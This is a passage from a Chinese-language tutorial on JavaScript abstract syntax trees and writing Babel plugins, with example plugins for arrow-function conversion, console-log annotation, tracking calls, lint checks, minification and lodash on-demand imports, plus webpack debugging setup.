=\u0026gt; { require.r(exports); require.d(exports, { default: () =\u0026gt; _DEFAULT_EXPORT__, }); const _DEFAULT_EXPORT__ = \u0026#34;hello\u0026#34;; }, }, ]); 代码块：webpack 中每个入口都会对应一个代码块，代码块又是许多模块的集合。但是代码块又不局限于以入口 entry 来作为区分条件。 事实上每个 entry 和异步加载的模块都会产生一个代码块，该代码块由该入口文件及它的直接和间接依赖的模块所组成。（chunk） 每个 chunk 都会有一个 id。 id 可能是 entry 入口中设置的名字，也能是默认生产的名字。\n懒加载一定意味着代码分割。\nAST 抽象语法树（Abstract Syntax Tree，AST）是源代码结构的一种抽象表示 它以树状的形式表现编程语言的代码结构，树上的每个节点都表示源代码中的一种结构 原理都是通过JavaScript Parser把代码转化为一颗抽象语法树（AST），这颗树定义了代码的结构，通过操作这颗树，可以精准的定位到声明语句、赋值语句、运算语句等，实现对代码的分析、优化、变更等操作 用途 代码语法、风格检查，代码的格式化、高亮、错误提示、自动补全等 优化变更代码，改变代码结构使达到想要的结构 第一步：词法解析，拆成最小词法单元，一个个分词（token）都有自己的含义。\n第二步：语法分析，生成 ast，程序由一行行代码组成，每行代码都是 body 中的某个元素，body 本身是数组格式，每个元素都有一个类型（如：变量声明）是一个节点。\nJavaScript Parser是把 JavaScript 源码转化为抽象语法树的解析器\n在 JavaScript 社区中，有几个常用的 JavaScript 解析器（Parser）。以下是其中一些常见的 JavaScript 解析器：\nAcorn: 一个轻量、快速的 JavaScript 解析器，完全由 js 代码实现，它以可扩展的方式解析 JavaScript 代码，并将其转换为抽象语法树（AST）。Acorn 被广泛用于各种工具和项目中（webpack、rollup 中）。 Esprima: Esprima 可以将 JavaScript 代码解析为标准的 ECMAScript 5.1 语法树。Esprima 也支持扩展，可以通过插件机制实现对 ECMAScript 6+ 的解析。 Babel Parser: Babel Parser（以前称为 Babylon）是 Babel 项目中使用的 JavaScript 解析器。它支持解析最新的 ECMAScript 规范，并且与 Babel 的转换工具链紧密集成。 Shift Parser: Shift Parser 是一个可扩展的 ECMAScript 解析器框架，它提供了一组 API 和工具，用于构建自定义的 JavaScript 解析器。Shift Parser 的目标是提供一个通用的解析器框架，适用于各种 ECMAScript 版本和语言扩展。 AST 节点 estree规范 spec.md astexplorer AST 节点（node） File 文件 Program 程序 Literal 字面量，代表一个值， NumericLiteral（数字） StringLiteral（字符串） BooleanLiteral（布尔） Identifier 标识符，代表一个变量 Statement 语句 Declaration 声明语句 Expression 表达式 Class 类 VariableDeclaration 变量声明，一个 VariableDeclaration 中可能存在多个 VariableDeclarator，一行声明多个变量 VariableDeclarator FunctionDeclaration，函数声明 BlockStatement，块级语句 1 var ast = \u0026#34;test\u0026#34;; 上面的 js 代码使用 acorn 解析器生成的 ast 内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 { \u0026#34;type\u0026#34;: \u0026#34;Program\u0026#34;, \u0026#34;start\u0026#34;: 0, \u0026#34;end\u0026#34;: 16, \u0026#34;body\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;VariableDeclaration\u0026#34;, \u0026#34;start\u0026#34;: 0, \u0026#34;end\u0026#34;: 16, \u0026#34;declarations\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;VariableDeclarator\u0026#34;, \u0026#34;start\u0026#34;: 4, \u0026#34;end\u0026#34;: 16, \u0026#34;id\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;Identifier\u0026#34;, \u0026#34;start\u0026#34;: 4, \u0026#34;end\u0026#34;: 7, \u0026#34;name\u0026#34;: \u0026#34;ast\u0026#34; }, \u0026#34;init\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;Literal\u0026#34;, \u0026#34;start\u0026#34;: 10, \u0026#34;end\u0026#34;: 16, \u0026#34;value\u0026#34;: \u0026#34;test\u0026#34;, \u0026#34;raw\u0026#34;: \u0026#34;\u0026#39;test\u0026#39;\u0026#34; } } ], \u0026#34;kind\u0026#34;: \u0026#34;var\u0026#34; } ], \u0026#34;sourceType\u0026#34;: \u0026#34;module\u0026#34; } 遍历语法树 AST是深度优先遍历\n选用 esprima 解析器及其配套工具。\n它们提供了对 Esprima 解析器的补充和扩展功能。以下是一些与 Esprima 解析器相关的常见工具库：\nEscodegen: Escodegen 是一个 JavaScript 代码生成器，它使用 esprima 解析器生成的抽象语法树（AST），将其转换回等效的 JavaScript 代码。Escodegen 允许你根据需要自定义生成的代码的格式和风格。 Esquery: Esquery 是一个用于在 JavaScript AST 中执行 CSS 风格查询的库。它允许你使用选择器语法从 JavaScript AST 中选择和提取特定的节点。Esquery 可以与 Esprima 解析器一起使用，以便在 AST 上执行高级的查询操作。 Esprima-walk: Esprima-walk 是一个用于遍历和访问 JavaScript AST 的工具库。它提供了一组简单的 API，使你能够轻松地访问 AST 中的节点，并执行自定义的操作或分析。 Estraverse: Estraverse 是一个 JavaScript AST 遍历器，它提供了对 AST 的深度优先遍历功能。它允许你在遍历 AST 时执行自定义的回调函数，并对节点进行修改或分析。 Eslevels: Eslevels 是一个用于静态分析和提取 JavaScript 代码中声明的变量和函数的库。它使用 Esprima 解析器解析 JavaScript 代码，并生成一组声明节点，使你能够分析代码中的变量作用域和依赖关系。 1 npm install esprima estraverse escodegen -S esprima：把 JS 源代码转成 AST 语法树\nestraverse：遍历语法树，修改树上的节点\nescodegen：把 AST 语法树重新转换成代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 let esprima = require(\u0026#34;esprima\u0026#34;); //把JS源代码转成AST语法树 let estraverse = require(\u0026#34;estraverse\u0026#34;); ///遍历语法树,通过插件修改树上的节点 let escodegen = require(\u0026#34;escodegen\u0026#34;); //把AST语法树重新转换成代码 let code = `function ast(){}`; let ast = esprima.parse(code); let indent = 0; const padding = () =\u0026gt; \u0026#34; \u0026#34;.repeat(indent); // 深度优先遍历 estraverse.traverse(ast, { enter(node) { console.log(padding() + node.type + \u0026#34;进入\u0026#34;); if (node.type === \u0026#34;FunctionDeclaration\u0026#34;) { node.id.name = \u0026#34;newAst\u0026#34;; // 修改函数名字 } indent += 2; }, leave(node) { indent -= 2; console.log(padding() + node.type + \u0026#34;离开\u0026#34;); }, }); const result = escodegen.generate(ast); console.log(result); // 重新生成代码 1 2 3 4 5 6 7 8 Program进入 FunctionDeclaration进入 Identifier进入 Identifier离开 BlockStatement进入 BlockStatement离开 FunctionDeclaration离开 Program离开 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 { \u0026#34;type\u0026#34;: \u0026#34;Program\u0026#34;, \u0026#34;body\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;FunctionDeclaration\u0026#34;, \u0026#34;id\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;Identifier\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;ast\u0026#34; }, \u0026#34;params\u0026#34;: [], \u0026#34;body\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;BlockStatement\u0026#34;, \u0026#34;body\u0026#34;: [] }, \u0026#34;generator\u0026#34;: false, \u0026#34;expression\u0026#34;: false, \u0026#34;async\u0026#34;: false } ], \u0026#34;sourceType\u0026#34;: \u0026#34;module\u0026#34; } Babel Parser 和 Esprima 是两个独立的 JavaScript 解析器，它们具有相似的目标，即解析 JavaScript 代码并生成相应的抽象语法树（AST）。尽管它们有相似的功能，但它们是由不同的团队开发和维护的，并且有一些区别。\n下面是 Babel Parser 和 Esprima 之间的一些关系和区别：\n代码基础：Babel Parser 是 Babel 项目中的一部分，它是作为 Babel 的默认解析器而开发的。它的代码基础是基于 Babylon 项目，该项目在后来改名为 Babel Parser。而 Esprima 是一个独立的项目，由独立的团队进行开发和维护。 ECMAScript 版本支持：Babel Parser 的设计目标是支持最新的 ECMAScript 语法和功能，包括 ECMAScript 2015+ 的特性，以及尚未被主流浏览器完全支持的提案。Esprima 则主要支持 ECMAScript 5.1 的语法，虽然它也可以通过插件进行扩展以支持 ECMAScript 6+ 的特性。 插件生态系统：Babel Parser 配合 Babel 的插件生态系统使用，这使得开发人员可以添加和使用各种转换和插件来修改或转换 JavaScript 代码。Esprima 本身并没有提供类似的插件系统，但可以与其他工具库结合使用，实现类似的功能。 Babel 工作过程分为三个部分：\nParse(解析) 将源代码转换成抽象语法树，树上有很多的estree 节点\nTransform(转换) 对抽象语法树进行转换\nGenerate(代码生成) 将上一步经过转换过的抽象语法树生成新的代码\nbabel 插件 @babel/parser 可以把源码转换成 AST\n@babel/traverse用于对 AST 的遍历，维护了整棵树的状态，并且负责替换、移除和添加节点\n@babel/generate 可以把 AST 生成源码，同时生成 sourcemap\n@babel/types 用于 AST 节点的工具库, 它包含了构造节点、验证节点类型以及变换 AST 节点的方法，帮助修改语法树\n@babel/template可以简化 AST 的创建逻辑，快速创建结点\n@babel/code-frame可以打印代码位置\n@babel/core Babel 的编译器，核心 API 都在这里面，比如常见的 transform、parse，并实现了插件功能，在 Babel 转换过程中，@babel/parser 被 @babel/core 使用，用于解析输入的 JavaScript 代码。@babel/parser 将代码解析为 AST，并将 AST 传递给 @babel/core，后者在 AST 上应用各种 Babel 插件和转换规则，执行代码转换操作。因此，@babel/parser 是 @babel/core 的一个重要依赖模块，用于提供代码解析的功能。\nbabylon Babel 的解析器，以前的 babel parser,是基于 acorn 扩展而来，扩展了很多语法,可以支持 es2020、jsx、typescript 等语法\nbabel-types-api\nBabel 插件手册\nbabeljs.io babel 可视化编译器\nbabel-types\n类型别名\nDefinitelyTyped\nAST 的前置知识 访问器模式 访问者模式 Visitor 对于某个对象或者一组对象，不同的访问者，产生的结果不同，执行操作也不同 Visitor 的对象中定义了用于 AST 中获取具体节点的方法 Visitor 上挂载以节点的 type 命名的方法，当遍历 AST 的时候，如果匹配上 type，就会执行对应的方法 说白了 Visitor 就是一个对象，该对象可以提供许多不同的方法（这些方法的名字就是 AST 中不同节点的名字），供给不同的访问者调用不同的方法 插件就是一个访问器对象，每个插件只关注一个 AST 中不同的节点类型，并对这些关注的节点进行操作 javascript 中的另一种访问器模式代码例子：\n访问器模式（Accessor Pattern）通过定义访问器方法来封装对对象属性的访问和修改操作。访问器模式提供了一种间接访问对象属性的方式，以便在访问和修改属性时可以执行额外的逻辑或进行验证。\n在访问器模式中，有两种类型的访问器方法：\nGetter（获取器）：Getter 方法用于获取对象属性的值。它通过定义一个函数来访问对象属性，并在访问时执行特定的逻辑。Getter 方法通常以get关键字为前缀，后面跟着属性名，例如get propertyName()。 Setter（设置器）：Setter 方法用于设置对象属性的值。它通过定义一个函数来修改对象属性，并在修改时执行特定的逻辑。Setter 方法通常以set关键字为前缀，后面跟着属性名，例如set propertyName(value)。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 const person = { firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34;, get fullName() { return this.firstName + \u0026#34; \u0026#34; + this.lastName; }, set fullName(value) { const parts = value.split(\u0026#34; \u0026#34;); this.firstName = parts[0]; this.lastName = parts[1]; }, }; console.log(person.fullName); // 输出: \u0026#34;John Doe\u0026#34; person.fullName = \u0026#34;Jane Smith\u0026#34;; console.log(person.firstName); // 输出: \u0026#34;Jane\u0026#34; console.log(person.lastName); // 输出: \u0026#34;Smith\u0026#34; path 语法树上的每个节点会对应一个路径（path 和 node 一一对应）。path\n路径对象上的属性或者方法：\nnode 当前 AST 节点 parent 父 AST 节点 parentPath 父 AST 节点的路径 scope 作用域 get(key) 获取某个属性的 path set(key, node) 设置某个属性 is 类型(opts) 判断当前节点是否是某个类型 find(callback) 从当前节点一直向上找到根节点(包括自己) findParent(callback)从当前节点一直向上找到根节点(不包括自己) insertBefore(nodes) 在之前插入节点 insertAfter(nodes) 在之后插入节点 replaceWith(replacement) 用某个节点替换当前节点 replaceWithMultiple(nodes) 用多个节点替换当前节点 replaceWithSourceString(replacement) 把源代码转成 AST 节点再替换当前节点 remove() 删除当前节点 traverse(visitor, state) 遍历当前节点的子节点,第 1 个参数是节点，第 2 个参数是用来传递数据的状态 skip() 跳过当前节点子节点的遍历 stop() 结束所有的遍历 每个路径对应一个节点。\nscope scope对象上的属性或者方法：\nscope.bindings 当前作用域内声明的所有变量 scope.path 生成作用域的节点对应的路径 scope.references 所有的变量引用的路径 getAllBindings() 获取从当前作用域一直到根作用域的集合 getBinding(name) 从当前作用域到根作用域查找变量 getOwnBinding(name) 在当前作用域查找变量 parentHasBinding(name, noGlobals) 从当前父作用域到根作用域查找变量 removeBinding(name) 删除变量 hasBinding(name, noGlobals) 判断是否包含变量 moveBindingTo(name, scope) 把当前作用域的变量移动到其它作用域中 generateUid(name) 生成作用域中的唯一变量名,如果变量名被占用就在前面加下划线 转换箭头函数插件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 const core = require(\u0026#34;@babel/core\u0026#34;); const types = require(\u0026#34;@babel/types\u0026#34;); const arrowFunctionPlugin = require(\u0026#34;@babel/plugin-transform-arrow-functions\u0026#34;).default; let arrowFunctionPlugin2 = { // visitor属性是固定的，babel内部就是写死取的这个属性 visitor: { // 这个的方法名字就是抽象语法树中各种节点对应的类型type ArrowFunctionExpression(path) { const { node } = path; node.type = \u0026#34;FunctionExpression\u0026#34;; const body = node.body; //判断body节点是不是BlockStatement (a,b)=\u0026gt;a + b; if (!types.isBlockStatement(body)) { //快速方便的构建节点 node.body = types.blockStatement([types.returnStatement(body)]); } // 处理this需要提升的问题 hoistFunctionEnvironment(path); }, }, }; function hoistFunctionEnvironment(path) { //1.看看当前节点里有没有使用到this const thisPaths = getThisPaths(path); if (thisPaths.length \u0026gt; 0) { //可以用来生成_this变量的路径 const thisEnv = path.findParent((parent) =\u0026gt; { //如果是函数，但是不是箭头函数的话就返回true //return types.isFunctionDeclaration(parent)|| parent.isProgram();; return ( (parent.isFunction() \u0026amp;\u0026amp; !parent.isArrowFunctionExpress()) || parent.isProgram() ); }); let thisBindings = \u0026#34;_this\u0026#34;; //如果此路径对应的作用域中没_this这个变量 if (!thisEnv.scope.hasBinding(thisBindings)) { //向它对应的作用域里添加一个变量 ，变量名_this,变量的值this const thisIdentifier = types.identifier(thisBindings); thisEnv.scope.push({ id: thisIdentifier, init: types.thisExpression(), }); thisPaths.forEach((thisPath) =\u0026gt; { thisPath.replaceWith(thisIdentifier); }); } } } function getThisPaths(path) { let thisPaths = []; //遍历此路径所有的子路径 path.traverse({ ThisExpression(thisPath) { thisPaths.push(thisPath); }, }); return thisPaths; } //这是JS源代码，用字符串表示 const sourceCode = ` const sum = (a,b)=\u0026gt;{ const minis = (a,b)=\u0026gt;{ console.log(this); return a-b; } return a+b; } `; const result = core.transform(sourceCode, { plugins: [arrowFunctionPlugin2], }); console.log(result.code); /** var _this = this; const sum = function (a,b){ console.log(_this); return a+b; } */ 日志插件 state.file.opts.filename 表示当前正在处理的文件的路径。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 const core = require(\u0026#34;@babel/core\u0026#34;); const types = require(\u0026#34;@babel/types\u0026#34;); const pathLib = require(\u0026#34;path\u0026#34;); //state代表状态，用在在插件处理的过程传递一些值或者变量 let consolePlugin = { visitor: { CallExpression(path, state) { state.age = 100; const { node } = path; if (types.isMemberExpression(node.callee)) { if (node.callee.object.name === \u0026#34;console\u0026#34;) { if ( [\u0026#34;log\u0026#34;, \u0026#34;info\u0026#34;, \u0026#34;warn\u0026#34;, \u0026#34;error\u0026#34;, \u0026#34;debug\u0026#34;].includes( node.callee.property.name ) ) { //获取这个console.log节点所在的行和列 const { line, column } = node.loc.start; const filename = pathLib.relative( __dirname, state.file.opts.filename ); node.arguments.unshift( types.stringLiteral(`${filename} ${line}:${column}`) ); } } } }, FunctionExpression(path, state) { console.log(state.age); // 100 }, }, }; //实现一个日志插件 const sourceCode = ` console.log(\u0026#39;hello\u0026#39;); `; const result = core.transform(sourceCode, { filename: \u0026#34;main.js\u0026#34;, plugins: [consolePlugin], }); console.log(result.code); 要实现在每个 console.log 语句中添加打印文件、行数和列数的信息，可以编写一个自定义的 Babel 插件。以下是一个简单的示例插件，可实现该功能：\n在项目根目录下创建一个名为 .babelrc 的文件，配置 Babel 的转换规则和插件：\n1 2 3 4 { \u0026#34;presets\u0026#34;: [\u0026#34;@babel/preset-env\u0026#34;], \u0026#34;plugins\u0026#34;: [\u0026#34;console-log-info\u0026#34;] // 需要发布这个包 } 或者在 webpack 配置文件中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const consolePlugin = require(\u0026#34;./plugins/consolePlugin.js\u0026#34;); module.exports = { module: { rules: [ { test: /.jsx?$/, use: { loader: \u0026#34;babel-loader\u0026#34;, options: { presets: [\u0026#34;@babel/preset-env\u0026#34;], plugins: [consolePlugin], }, }, }, ], }, }; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // 这个插件可以直接在webpack中的babel-loader中配置即可使用 const pathLib = require(\u0026#34;path\u0026#34;); module.exports = function ({ types }) { return { visitor: { CallExpression(path, state) { const { node } = path; if (types.isMemberExpression(node.callee)) { if (node.callee.object.name === \u0026#34;console\u0026#34;) { if ( [\u0026#34;log\u0026#34;, \u0026#34;info\u0026#34;, \u0026#34;warn\u0026#34;, \u0026#34;error\u0026#34;, \u0026#34;debug\u0026#34;].includes( node.callee.property.name ) ) { //获取这个console.log节点所在的行和列 const { line, column } = node.loc.start; const filename = pathLib.relative( __dirname, state.file.opts.filename ); node.arguments.unshift( types.stringLiteral(`${filename} ${line}:${column}`) ); } } } }, }, }; }; 打印表示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 const pathLib = require(\u0026#34;path\u0026#34;); module.exports = function ({ types }) { return { visitor: { CallExpression(path, state) { const { node } = path; if (types.isMemberExpression(node.callee)) { if (node.callee.object.name === \u0026#34;console\u0026#34;) { if ( [\u0026#34;log\u0026#34;, \u0026#34;info\u0026#34;, \u0026#34;warn\u0026#34;, \u0026#34;error\u0026#34;, \u0026#34;debug\u0026#34;].includes( node.callee.property.name ) ) { const fileInfo = state.file.opts.filename.split(\u0026#34;/\u0026#34;); const fileName = fileInfo[fileInfo.length - 1]; const { line, column } = node.loc.start; const logStatement = types.stringLiteral( `[${fileName}:${line}:${column}]` ); const args = path.node.arguments; args.unshift(logStatement); path.replaceWith( types.callExpression(types.identifier(\u0026#34;console.log\u0026#34;), args) ); } } } }, }, }; }; 打印表示：\n数据埋点 当调用方法时，向服务器发送一个请求，通知服务器。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 const core = require(\u0026#34;@babel/core\u0026#34;); const autoTrackerPlugin = require(\u0026#34;./auto-tracker-plugin\u0026#34;); const sourceCode = ` function sum(a, b){ return a + b }; const multiply = function(a, b){ return a * b }; const minus = (a, b)=\u0026gt;a + b; class Calculator{ divide(a, b){ return a/b } } `; const result = core.transform(sourceCode, { plugins: [ autoTrackerPlugin({ name: \u0026#34;logger\u0026#34;, whiteList: [\u0026#34;sum\u0026#34;], // 针对叫这个函数的名的函数添加数据埋点 }), ], }); console.log(result.code); 数据埋点中的 babel 插件在这里导出的是一个函数，该函数返回一个对象。\nauto-tracker-plugin.js：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 const core = require(\u0026#34;@babel/core\u0026#34;); const types = require(\u0026#34;@babel/types\u0026#34;); const template = require(\u0026#34;@babel/template\u0026#34;); const importModule = require(\u0026#34;@babel/helper-module-imports\u0026#34;); /** * babel插件可以写为一个对象，也可以写为一个函数，写为函数是，可以调用函数并传参 * 实现此插件需要二步 * 1.判断是否源代码里已经引入了logger模块，如果引入了直接用，如果没有引入要手工引入 * 2.找到代码中所有的函数，向里面插件调用logger方法 */ const autoTrackerPlugin = (options) =\u0026gt; { return { visitor: { Program: { enter(path, state) { let loggerId; path.traverse({ ImportDeclaration(path) { //此方法会进入多次 const importedModuleName = path.get(\u0026#34;source\u0026#34;).node.value; if (importedModuleName === options.name) { const specifierPath = path.get(\u0026#34;specifiers.0\u0026#34;); if ( specifierPath.isImportDefaultSpecifier() || //默认导入 import logger from \u0026#39;logger\u0026#39; specifierPath.isImportSpecifier() || //普通导入 import {logger} from \u0026#39;logger\u0026#39; specifierPath.ImportNamespaceSpecifier() ) { //命名空间导入 import * as logger from loggerId = specifierPath.node.local.name; } path.stop(); //不再遍历了，跳过后续的所有的查找和遍历 } }, }); //如果loggerId在遍历完了以后还是undefined。说明源码中没有主动引入logger if (!loggerId) { // import xx from \u0026#39;logger\u0026#39; , 构建一个抽象语法树节点 loggerId = importModule.addDefault(path, options.name, { nameHint: path.scope.generateUid(options.name), }); } //类似ejs 模板引擎 返回的是一个语法树的节点 state.loggerNode = template.statement(`LOGGER();`)({ LOGGER: loggerId, }); }, }, \u0026#34;FunctionDeclaration|FunctionExpression|ArrowFunctionExpression|ClassMethod\u0026#34;( path, state ) { const { node } = path; // 白名单 if (node.id \u0026amp;\u0026amp; options.whiteLists.includes(node.id.name)) { ///如果它的body已经是一个语句块了，直接在块的开始添加方法调用即可 if (types.isBlockStatement(node.body)) { node.body.body.unshift(state.loggerNode); } else { const newNode = types.blockStatement([ state.loggerNode, types.expressionStatement(node.body), ]); path.get(\u0026#34;body\u0026#34;).replaceWith(newNode); } } }, }, }; }; module.exports = autoTrackerPlugin; 转化后的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 const sourceCode = ` import logger from \u0026#39;logger\u0026#39; function sum(a, b){ logger() return a + b }; const multiply = function(a, b){ logger() return a * b }; const minus = (a, b)=\u0026gt;{ logger() return a + b }; class Calculator{ divide(a, b){ logger() return a/b } } `; 模拟 eslint 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 function eslintPlugin({ fix }) { return { // 遍历语法树之前执行该pre函数 pre(file) { file.set(\u0026#34;errors\u0026#34;, []); }, visitor: { CallExpression(path, state) { const { node } = path; const errors = state.file.get(\u0026#34;errors\u0026#34;); if (node.callee.object \u0026amp;\u0026amp; node.callee.object.name === \u0026#34;console\u0026#34;) { Error.stackTraceLimit = 0; // 设置调用栈的长度 errors.push( path.buildCodeFrameError(`代码中不能出现console.log语句`), Error ); // 构建代码错误 if (fix) { path.parentPath.remove(); } } }, }, post(file) { console.log(file.get(\u0026#34;errors\u0026#34;)); }, }; } module.exports = eslintPlugin; 代码压缩 uglifyPlugin.js\n其中的 Scopable 是类型别名，其实就是一系列 ast 节点名的组合，类似于 TS 的联合类型。\n类型别名 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function uglifyPlugin() { return { visitor: { Scopable(path) { Object.entries(path.scope.bindings).forEach(([key, binding]) =\u0026gt; { //在当前的作用域中生成一个不重复的变量名 const newName = path.scope.generateUid(\u0026#34;t\u0026#34;); // age =\u0026gt; ? name=？ binding.path.scope.rename(key, newName); }); }, }, }; } module.exports = uglifyPlugin; 按需加载 以 lodash 为例子，babel-plugin-import，且这个库只支持 antd，antd-mobile，lodash，materia-ui。\nwebapck.config.js:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 const path = require(\u0026#34;path\u0026#34;); module.exports = { mode: \u0026#34;development\u0026#34;, entry: \u0026#34;./src/index.js\u0026#34;, output: { path: path.resolve(\u0026#34;dist\u0026#34;), filename: \u0026#34;bundle.js\u0026#34;, }, module: { rules: [ { test: /\\.js$/, use: { loader: \u0026#34;babel-loader\u0026#34;, options: { plugins: [ [ \u0026#34;babel-plugin-import\u0026#34;, { libraryName: \u0026#34;lodash\u0026#34;, // 查看lodash的核心包，可以发现，lodash中每个功能函数都直接放在loadsh文件夹的根目录中，而babel-plugin-import插件默认是取目标库下面的lib文件夹中找对应的文件，所以还需要设置库的目标文件所在的目录。 libraryDirectory: \u0026#34;\u0026#34;, // 这个值默认是lib }, ], ], }, }, }, ], }, }; 按需加载的本质：\n1 2 3 4 import { flatten, concat } from \u0026#34;lodash\u0026#34;; // 转为下面的代码形式 import flatten from \u0026#34;lodash/flatten\u0026#34;; import concat from \u0026#34;lodash/flatten\u0026#34;; 转为：\n编译顺序为首先plugins从左往右,然后presets从右往左。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 //babel核心模块 const core = require(\u0026#34;@babel/core\u0026#34;); //用来生成或者判断节点的AST语法树的节点 let types = require(\u0026#34;@babel/types\u0026#34;); const visitor = { ImportDeclaration(path, state) { const { node } = path; //获取节点 const { specifiers } = node; //获取批量导入声明数组 const { libraryName, libraryDirectory = \u0026#34;lib\u0026#34; } = state.opts; //获取选项中的支持的库的名称 //如果说此节点导入的包名和配置的按需加载包名是一样的，并且不是默认导入的话 if ( node.source.value === libraryName \u0026amp;\u0026amp; //并且导入不是默认导入才会进来 !types.isImportDefaultSpecifier(specifiers[0]) ) { //遍历批量导入声明数组 const declarations = specifiers.map((specifier) =\u0026gt; { //返回一个importDeclaration节点 return types.importDeclaration( //导入声明importDefaultSpecifier flatten [types.importDefaultSpecifier(specifier.local)], //导入模块source lodash/flatten types.stringLiteral( libraryDirectory ? `${libraryName}/${libraryDirectory}/${specifier.imported.name}` : `${libraryName}/${specifier.imported.name}` ) ); }); path.replaceWithMultiple(declarations); //替换当前节点 } }, }; module.exports = function () { return { visitor, }; }; 注意，在 webpack 配置文件中配置该插件后，传给插件的参数的方式是以下这种：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 { test: /\\.js$/, use: { loader: \u0026#34;babel-loader\u0026#34;, options:{ plugins:[ [ \u0026#39;babel-plugin-import\u0026#39;, { libraryName:\u0026#39;lodash\u0026#39;, libraryDirectory:\u0026#39;\u0026#39; } ] ] } }, }, 这种方式传参时，对应插件中获取这些参数的方式是通过下面这种方式获取：\n1 const { libraryName, libraryDirectory = \u0026#39;lib\u0026#39; } = state.opts;//获取选项中的支持的库的名称 在 webpack 中使用自己编写的 bable 插件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 const path = require(\u0026#34;path\u0026#34;); module.exports = { mode: \u0026#34;development\u0026#34;, entry: \u0026#34;./src/index.js\u0026#34;, output: { path: path.resolve(\u0026#34;dist\u0026#34;), filename: \u0026#34;bundle.js\u0026#34;, }, module: { rules: [ { test: /\\.js$/, use: { loader: \u0026#34;babel-loader\u0026#34;, options: { plugins: [ [ path.resolve(__dirname, \u0026#34;plugins/babel-plugin-import.js\u0026#34;), { libraryName: \u0026#34;lodash\u0026#34;, libraryDirectory: \u0026#34;\u0026#34;, }, ], [ path.resolve(__dirname, \u0026#34;plugins/babel-plugin-import.js\u0026#34;), { libraryName: \u0026#34;antd\u0026#34;, }, ], ], }, }, }, ], }, }; 上面的代码中@babel/types 两个作用：\n判断某个节点是不是某个类型 快速通过工厂方法创建节点实例 Babel 插件手册\nbabel 参考资料：\nBabel 插件手册 babel-types 不同的 parser 解析 js 代码后得到的 AST 在线可视化的看到 AST babel 从入门到入门的知识归纳 Babel 内部原理分析 babel-plugin-react-scope-binding transform-runtime Babel 默认只转换新的 JavaScript 语法，而不转换新的 API。例如，Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol、Promise 等全局对象，以及一些定义在全局对象上的方法（比如 Object.assign）都不会转译,启用插件 babel-plugin-transform-runtime 后，Babel 就会使用 babel-runtime 下的工具函数 ast-spec babel-handbook 扩展：使用 babel 中的 types 库和 template 库创建 ast 节点的差别。\n当有一个非常复杂或者源码非常多的一个代码段需要创建，那么 types 库只能一个个一层层的创建然后再一个个一层层的组合。 而 template 库可以基于源代码字符串快速创建其对应的抽象语法树。\n1 2 3 4 const template = require(\u0026#34;@babel/template\u0026#34;); let astNode = template.statement(\u0026#34;xxx\u0026#34;)({ xxx: `源码部分`, }); webpack 工作流 调试 webpack 方式一：\npackage.json 中\n1 2 3 4 5 { \u0026#34;script\u0026#34;: { \u0026#34;build\u0026#34;: \u0026#34;webpack\u0026#34; } } 当执行这个脚本命令时，找到项目根目录下 node_modules 目录下的.bin 目录下的 webpack.cmd，该文件中执行的是 node_modules 目录下的 webpack/bin/webpack.js 文件，该文件中会去调用 webpack-cli 目录中的 bin 目录中的 cli.js 文件。所以可以直接调试 cli 文件：\n1 2 3 4 node --inspect-brk ./node_modules/webpack/bin/webpack.js node --inspect-brk ./node_modules/webpack-cli/bin/cli.js 然后打开 Chrome 浏览器控制台调试\n方式二：\n在 vscode 中通过调试文件进行 webpack 源码调试。\n打开工程目录，点击调试按钮，再点击小齿轮的配置按钮系统就会生成 launch.json 配置文件 修改好了以后直接点击 F5 就可以启动调试 .vscode\\launch.json\n1 2 3 4 5 6 7 8 9 10 11 12 13 { 